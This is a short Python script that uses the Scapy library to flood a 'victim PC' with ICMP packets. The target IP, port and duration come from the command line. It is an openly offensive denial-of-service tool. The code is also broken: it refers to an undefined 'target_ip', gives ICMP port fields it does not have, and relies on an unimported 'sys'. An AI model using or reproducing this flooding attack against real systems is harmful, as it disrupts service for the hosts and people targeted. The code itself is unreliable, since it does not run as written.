#Extra packages needed for this to run: Scapy.py
from datetime import datetime
from scapy.all import *





def ping(victim_ip, targetedPort, duration):
    """
     Ping victim PC performing a ICMP Flood Attack
     The ICMP Flood Attack Aglortihm is based on sending packets 
     as fast as possible without waiting for the victim PCs response 
    """
    for _ in range(duration):
        ip = IP(dst=target_ip)
        icmp = ICMP(sport=RandShort(), dport=targetedPort)
        pkg = ip/icmp
        send(pkg)
        

if __name__ == "__main__":
    """Cmd args: targetIp, TargetedPort, duration"""
    print("Preparing to ping victim PC")
    ping(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
